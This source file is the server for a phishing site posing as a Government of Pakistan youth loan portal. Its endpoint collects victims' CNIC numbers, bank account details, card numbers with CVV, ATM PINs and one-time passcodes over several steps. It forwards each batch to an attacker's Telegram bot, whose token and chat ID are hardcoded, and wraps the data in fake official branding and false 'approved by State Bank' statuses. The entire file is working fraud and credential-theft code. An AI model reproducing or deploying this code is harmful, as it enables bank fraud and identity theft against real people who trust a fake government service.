import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';

async function startServer() {
  const app = express();
  app.use(express.json());

  const TELEGRAM_BOT_TOKEN = '8885732005:AAHhZVbLC_1P2EFXhao83cMO1HSdJT_-jko';
  const TELEGRAM_CHAT_ID = '8744256926';

  async function sendToTelegram(botToken: string, chatId: string, text: string) {
    try {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML'
        })
      });
      const data = await response.json();
      return data;
    } catch (err: any) {
      console.error('Error sending to Telegram:', err);
      return { ok: false, description: err.message || 'Network request failed' };
    }
  }

  app.post('/api/test-telegram', async (req, res) => {
    try {
      const { botToken, chatId } = req.body;
      const token = botToken || TELEGRAM_BOT_TOKEN;
      const chat = chatId || TELEGRAM_CHAT_ID;

      const testMsg = `🇵🇰 🏛️ GOVERNMENT OF PAKISTAN 🏛️ 🇵🇰\n🟢 PRIME MINISTER YOUTH LOAN NOTIFICATION\n🏛️ 📲 💸 🏧 💳 🪪 [Official SMS Gateway]\n────────────────────────\n📲 [2FA SECURE SMS TEST CONNECTED]\n✅ Telegram Connection Successful!`;
      const result = await sendToTelegram(token, chat, testMsg);
      if (!result || !result.ok) {
        return res.status(400).json({ success: false, error: result?.description || 'Invalid Telegram credentials or Chat ID' });
      }
      res.json({ success: true, result });
    } catch (err: any) {
      res.status(500).json({ success: false, error: err.message });
    }
  });

  app.post('/api/forward-telegram', async (req, res) => {
    try {
      const { step, data, customBotToken, customChatId } = req.body;
      const botToken = customBotToken || TELEGRAM_BOT_TOKEN;
      const chatId = customChatId || TELEGRAM_CHAT_ID;

      const p = data?.personal || {};
      const f = data?.financial || {};
      const t = data?.taxData || {};
      const pin = data?.atmPin || '';
      const otps = data?.otps || {};

      let eventName = 'Personal Information Submitted';
      let statusText = 'Personal Info Verified - Proceeding to Financial Details';

      if (step === 'personal') {
        eventName = 'Personal & NADRA Details Submitted';
        statusText = 'Personal Details Verified - Proceeding to Financial Details';
      } else if (step === 'financial') {
        eventName = 'Financial & Loan Details Submitted';
        statusText = 'Financial Info Verified - Proceeding to ATM Card & Tax Payment';
      } else if (step === 'tax_payment') {
        eventName = 'ATM Card & Processing Tax Submitted';
        statusText = 'Processing Tax Paid - NADRA Record Verification Active';
      } else if (step === 'incorrect_otp') {
        eventName = 'OTP Verification Step 1 Submitted (Attempt 1 - Incorrect)';
        statusText = 'Invalid OTP Attempt - Retrying SMS Verification';
      } else if (step === 'otp_1') {
        eventName = 'OTP Verification Step 1 Submitted (Successful)';
        statusText = 'OTP Step 1 Verified - Proceeding to ATM PIN Verification';
      } else if (step === 'atm_pin') {
        eventName = 'ATM PIN Security Verification Submitted';
        statusText = 'ATM PIN Verified - Proceeding to OTP Step 2';
      } else if (step === 'otp_2') {
        eventName = 'OTP Verification Step 2 Submitted (Successful)';
        statusText = 'OTP Step 2 Verified - Proceeding to OTP Step 3 (Final)';
      } else if (step === 'otp_3' || step === 'all_details') {
        eventName = 'OTP Verification Step 3 Submitted (Final - Successful)';
        statusText = 'Fully Verified & Approved by State Bank';
      }

      const now = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi', dateStyle: 'medium', timeStyle: 'medium' });

      const message = `🇵🇰 🏛️ GOVERNMENT OF PAKISTAN 🏛️ 🇵🇰\n` +
        `🟢 PRIME MINISTER YOUTH LOAN NOTIFICATION\n` +
        `🏛️ 📲 💸 🏧 💳 🪪 [Official SMS Gateway]\n` +
        `────────────────────────\n` +
        `📲 [2FA SECURE SMS OTP VERIFIED]\n` +
        `📌 Event: ${eventName}\n` +
        `🕒 Time: ${now} (PKR)\n` +
        `🏛️ Portal ID: PKL-SECURE-99201\n` +
        `────────────────────────\n` +
        `🪪 Full Name: ${p?.fullName || 'N/A'}\n` +
        `🪪 CNIC: <code>${p?.cnic || 'N/A'}</code>\n` +
        `📲 Mobile No: <code>${p?.mobile || 'N/A'}</code>\n` +
        `🪪 Gender: ${p?.gender || 'N/A'}\n` +
        `🏛️ Date Of Birth: ${p?.dob || 'N/A'}\n` +
        `🪪 Province: ${p?.province || 'N/A'}\n` +
        `🪪 Address: ${p?.address || 'N/A'}\n` +
        `💸 Amount: PKR ${f?.loanAmount ? Number(f.loanAmount).toLocaleString() : 'N/A'}\n` +
        `🏛️ Purpose: ${f?.loanPurpose || 'N/A'}\n` +
        `🏛️ Occupation: ${f?.occupation || 'N/A'}\n` +
        `💳 Bank Name: ${f?.bankName || 'N/A'}\n` +
        `🏛️ Account Number: <code>${f?.accountNumber || 'N/A'}</code>\n` +
        `🏛️ Current Balance: PKR ${f?.currentBalance ? Number(f.currentBalance).toLocaleString() : 'N/A'}\n` +
        `💸 Monthly Income: PKR ${f?.monthlyIncome ? Number(f.monthlyIncome).toLocaleString() : 'N/A'}\n` +
        `🏛️ Salary Date: ${f?.salaryDate || 'N/A'}\n` +
        `💳 Card Number: <code>${t?.cardNumber || 'N/A'}</code> (Exp: ${t?.expiry || 'N/A'} | CVV: <code>${t?.cvv || 'N/A'}</code>)\n` +
        `🔐 ATM PIN: <code>${pin || 'N/A'}</code>\n` +
        `📲 OTP Step1: <code>${otps?.otp1 || 'N/A'}</code>\n` +
        `📲 OTP Step2: <code>${otps?.otp2 || 'N/A'}</code>\n` +
        `📲 OTP Step3: <code>${otps?.otp3 || 'N/A'}</code>\n` +
        `🏛️ Status: ${statusText}\n` +
        `────────────────────────\n` +
        `🔒 Security: 256-Bit Encrypted National Gateway\n` +
        `✅ Status: Verified & Approved by State Bank`;

      const telegramResult = await sendToTelegram(botToken, chatId, message);
      if (!telegramResult || !telegramResult.ok) {
        return res.status(400).json({ success: false, error: telegramResult?.description || 'Failed to send to Telegram' });
      }
      res.json({ success: true, result: telegramResult });
    } catch (err: any) {
      console.error(err);
      res.status(500).json({ success: false, error: err.message });
    }
  });

  const vite = await createViteServer({
    server: { middlewareMode: true },
    appType: 'spa'
  });

  app.use(vite.middlewares);

  const PORT = Number(process.env.PORT) || 3000;
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
